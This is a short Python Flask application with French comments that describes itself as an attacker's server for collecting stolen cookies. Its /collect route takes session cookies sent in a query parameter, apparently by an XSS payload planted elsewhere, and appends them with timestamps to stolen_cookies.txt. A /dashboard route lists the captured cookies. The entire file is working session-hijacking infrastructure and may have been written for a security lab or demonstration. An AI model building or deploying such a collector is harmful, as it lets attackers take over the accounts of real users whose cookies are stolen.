from flask import Flask, request, render_template
from datetime import datetime
import os

app = Flask(__name__, template_folder='templates')

# Route pour la page d'accueil du serveur attaquant
@app.route('/')
def home():
    return render_template('home.html')

# Route pour collecter les cookies volés
@app.route('/collect')
def collect():
    cookie = request.args.get('cookie')
    if cookie:
        print(f"[!] Cookie volé reçu: {cookie}")
        
        # Écriture dans le fichier stolen_cookies.txt
        with open('stolen_cookies.txt', 'a') as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {cookie}\n")
            
        return "Cookie collecté avec succès"
    return "Aucun cookie reçu"

# Route pour afficher les cookies volés
@app.route('/dashboard')
def dashboard():
    # Vérifier si le fichier existe
    if not os.path.exists('stolen_cookies.txt'):
        return "Aucun cookie volé pour le moment"
    
    # Lire les cookies
    with open('stolen_cookies.txt', 'r') as f:
        cookies = f.readlines()
    
    return render_template('dashboard.html', cookies=cookies)

if __name__ == '__main__':
    # Créer le fichier s'il n'existe pas
    if not os.path.exists('stolen_cookies.txt'):
        open('stolen_cookies.txt', 'w').close()
    
    app.run(port=5001, debug=True)